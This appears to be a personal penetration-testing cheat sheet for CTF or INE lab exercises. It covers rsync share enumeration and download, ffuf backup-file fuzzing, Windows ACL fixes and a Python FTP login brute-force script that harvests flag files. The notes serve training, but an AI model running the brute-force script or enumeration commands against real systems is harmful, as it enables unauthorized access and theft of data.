RSYNC SERVER useful commands :

✅ 2. List available rsync shares (modules)

You can list the available "modules" (like shares on an rsync server) using:

rsync rsync://rsync.example.com/

This will output something like:

backup       Daily backups
media        Shared media files

These are top-level directories (modules) that the server exports.

✅ 3. Browse a specific share

To list the contents of a specific module, run:

rsync rsync://rsync.example.com/media/

This shows the directory structure inside the media share.

You can also browse subdirectories:

rsync rsync://rsync.example.com/media/music/

✅ 4. Download content to your local machine

To copy files or entire directories from the rsync server, use:

rsync -av rsync://rsync.example.com/media/ /path/to/local/folder/
  • a: archive mode (preserves permissions, symlinks, etc.)
  • v: verbose (shows progress)

FTP BRUTE FORCE PYTHON Script

# try_ftp_users.py
import ftplib, os

host = "target1.ine.local"
password = "letmein"
usernames = ["root","daemon","bin","sys","sync","games","man","lp","mail","news",
             "uucp","proxy","www-data","backup","list","irc","gnats","nobody","_apt",
             "letmein","admin","ftp","user","test"]

for u in usernames:
    try:
        ftp = ftplib.FTP(host, timeout=8)
        ftp.login(u, password)
        print(f"[+] LOGIN SUCCESS: {u}:{password}")
        try:
            print("  LISTING /")
            ftp.retrlines('LIST')
        except Exception as e:
            print("  [!] Could not list:", e)

        # attempt to download some common filenames
        candidates = ["flag.txt","FLAG.txt","user.txt","root.txt","flag","ine.txt","INE.txt","flag1.txt"]
        os.makedirs(f"download_{u}", exist_ok=True)
        for f in candidates:
            try:
                local = os.path.join(f"download_{u}", f)
                with open(local, "wb") as fh:
                    ftp.retrbinary("RETR " + f, fh.write)
                print("  [*] Downloaded", f, "->", local)
            except Exception:
                pass

        ftp.quit()
        # stop after first success (remove break to try all)
        break
    except Exception as e:
        print(f"[-] {u}:{password} failed -> {e}")

Finding backup files in a directory

ffuf -u http://target.ine.local/FUZZ -w /usr/share/dirb/wordlists/big.txt -e .bak,.tar.gz,.zip,.sql,.bak.zip

  • u: Target URL with FUZZ placeholder.
  • w: Wordlist for payload.
  • e: Append extensions (.bak, .zip, etc.).
  • mc 200: Show only 200 OK responses.

    The -e flag in ffuf appends specified file extensions to each word from the wordlist.

    For example, -e .php,.txt will test both word.php and word.txt for every entry in your wordlist, helping you discover hidden files with those extensions.

RSYNC

The command rsync rsync://<target-ip> connects directly to the rsync daemon on the target and lists all accessible modules if no path is specified.

In CTFs, this often reveals hidden or flag-named modules.

To download a file from an rsyncserver:

Syntax

rsync rsync://<target-ip>/<module>/<file> <local-path>

Example

If the module is files and the file is secret.txt:

rsync rsync://192.168.1.100/files/secret.txt ./

This downloads secret.txt to your current directory.

Windows ACL Deny Takes Precedence – Fix Access Denied Despite Admin Rights

icacls "C:\path\to\file_or_folder" /remove:d "NT AUTHORITY\SYSTEM" /T /C /Q

  • "C:\path\to\file_or_folder" —> Replace with the actual path.
  • /remove:d "NT AUTHORITY\SYSTEM" —> Removes only the denied permissions for SYSTEM.

  • /T —> Applies to all subfolders and files.
  • /C — > Continues on errors (e.g., access denied on some items).
  • /Q — > Runs quietly, suppressing success messages.
